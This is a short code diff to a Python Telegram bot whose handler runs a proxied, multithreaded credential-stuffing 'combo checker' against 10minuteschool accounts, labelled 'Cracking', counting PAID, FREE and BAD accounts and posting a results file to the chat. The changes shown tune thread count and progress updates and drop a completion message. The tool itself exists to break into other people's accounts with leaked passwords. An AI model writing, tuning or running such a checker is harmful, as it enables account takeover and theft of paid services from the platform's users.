@@ -162,7 +162,7 @@ async def check_combos(client: Client, message: Message):
         total_combos = len(combos)
         checked_combos = 0
 
-        with ThreadPoolExecutor(max_workers=250) as executor:
+        with ThreadPoolExecutor(max_workers=100) as executor:
             futures = {
                 executor.submit(checker, combo, proxies): combo for combo in combos
             }
@@ -171,18 +171,12 @@ async def check_combos(client: Client, message: Message):
                     checked_combos += 1
                     pbar.update(1)
 
-                    if checked_combos % 20 == 0:
+                    if checked_combos % 1 == 0:
                         await status.edit_text(
 f"<b>10minuteschool Cracking...</b>\n"
 f"<b>✅ Checked:</b> {checked_combos}/{total_combos}\n"
 f"<b>PAID:</b> {PAID} | <b>FREE:</b> {FREE} | <b>BAD:</b> {BAD}\n"
                         )
-
-        await status.edit_text(
-f"<b>✅ Combo checking completed.</b>\n"
-f"<b>Total Checked:</b> {total_combos}\n"
-f"<b>PAID:</b> {PAID} | <b>FREE:</b> {FREE} | <b>BAD:</b> {BAD}"
-        )
 
         if os.path.exists(RESULT_FILE):
             await client.send_document(message.chat.id, RESULT_FILE)
